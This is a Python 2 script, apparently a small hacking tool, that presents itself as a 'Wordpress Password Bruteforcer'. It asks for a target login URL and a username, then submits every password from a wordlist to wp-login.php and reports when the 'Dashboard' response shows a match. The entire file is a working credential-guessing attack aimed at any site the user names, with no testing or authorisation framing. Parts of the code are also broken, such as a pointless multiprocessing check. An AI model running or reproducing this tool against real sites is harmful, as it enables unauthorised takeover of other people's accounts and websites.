import requests, os, sys, random, multiprocessing
os.system("clear")
try:
	CGR = '\33[34m'
	CEN = '\33[0m'
	CRE = '\33[91m'
	CHE = '\33[92m'
	CYL = '\33[93m'

	os.system('clear')
	print(CGR+"""_  _ ____ _  _ ___ ____ ____ ____ _ ___ 
|\/| |__|  \/   |  |___ |__/ |  | |  |  
|  | |  | _/\_  |  |___ |  \ |__| |  |  
                                        
"""+CEN)
	print("==================================================")
	print(CRE+"Wordpress Password Bruteforcer"+CEN)
	print("==================================================")
	print(CRE+" Coder    : Adittya (Founder Maxteroit)"+CEN)
	print(CRE+" Github   : https://github.com/maxteroit)"+CEN)
	print(CRE+" Website  : https://maxteroit.com)"+CEN)
	print(CRE+" Email    : adittya@maxteroit.com)"+CEN)
	print("==================================================")
	target_url = raw_input("Target URL Login Page [Ex: http://aa.com/wp-login.php] : ")
	username = raw_input("Input Username Target : ")
	print("Wordlist : ")
	print("1. Use your own wodlist")
	print("2. Use the word list provided")
	choose = raw_input("Choose [1/2] : ")

	if choose == str("1"):
		wordlist = raw_input("Enter your wordlist path : ")
	elif choose == str("2"):
		wordlist = "wordlist.txt"
	else:
		print("Wrong Input !")

	data_diction = {"log" : username, "pwd" : "", "wp-submit": "submit"}

	with open(wordlist, "r") as wordlist_file:
		for line in wordlist_file:
			word = line.strip()
			data_diction["pwd"] = word
			response = requests.post(target_url, data=data_diction)
			proc = multiprocessing.Process(target=response)
			if proc:
				if "The password you entered for the username" in response.content:
					print(CRE+"[-]"+CEN+" "+word+" ==> Wrong Password")

				elif "username." in response.content:
					print("[-] Wrong Username !!!")
					exit()

				elif "Dashboard" in response.content:
					print(CHE+"[+]"+CEN+" Password Found ==> "+CYL+word+CEN)
					exit()

		print("[+] End Of Wordlist")
except KeyboardInterrupt:
	print("Program Terminated")
	sys.exit(0)
except requests.exceptions.ConnectionError:
	print(CRE+"Connection Blocked by Target or Wrong Target Links !"+CEN)
	sys.exit(0)
except requests.exceptions.MissingSchema:
	print(CRE+"Use HTTP or HTTPS on your Target URL !"+CEN)
except requests.exceptions.InvalidURL:
	print(CRE+"Use Valid Targe URL !"+CEN)